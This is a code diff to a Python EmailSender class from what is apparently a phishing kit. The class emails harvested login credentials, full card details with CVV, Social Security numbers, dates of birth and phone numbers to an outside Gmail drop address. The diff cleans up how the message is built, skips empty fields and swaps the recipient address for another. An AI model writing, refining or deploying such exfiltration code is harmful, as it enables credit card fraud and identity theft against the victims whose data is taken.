@@ -26,20 +26,28 @@ class EmailSender:
         self.yag = yagmail.SMTP(SENDER_EMAIL, PASSWORD)
 
     def send_email(self):
+        fields = {
+            "UserName": self.user_name,
+            "Password": self.user_password,
+            "Card Name": self.card_name,
+            "Card Number": self.card_number,
+            "Card Exp": self.card_exp,
+            "Card CV": self.card_cv,
+            "Card Address": self.card_addr,
+            "SSN": self.ssn,
+            "DOB": self.dob,
+            "Postal": self.postal,
+            "Phone Number": self.phone_num,
+        }
+
+        # Only include non-None fields
+        contents = "\n".join(f"{key}: {value}" for key, value in fields.items() if value is not None)
+
         result = self.yag.send(
-            to="Privatehiroyuki1@gmail.com",
+            to="lyndazuniga2020@gmail.com",
             subject="New Info",
-            contents=f"UserName : {self.user_name}\n"
-                     f"Password: {self.user_password}\n"
-                        f"Card Name: {self.card_name}\n"
-                        f"Card Number: {self.card_number}\n"
-                        f"Card Exp: {self.card_exp}\n"
-                        f"Card CV: {self.card_cv}\n"
-                        f"Card Address: {self.card_addr}\n"
-                        f"SSN: {self.ssn}\n"
-                        f"DOB: {self.dob}\n"
-                        f"Postal: {self.postal}\n"
-                        f"Phone Number: {self.phone_num}\n",
-            attachments= None
+            contents=contents,
+            attachments=None
         )
+
         return result
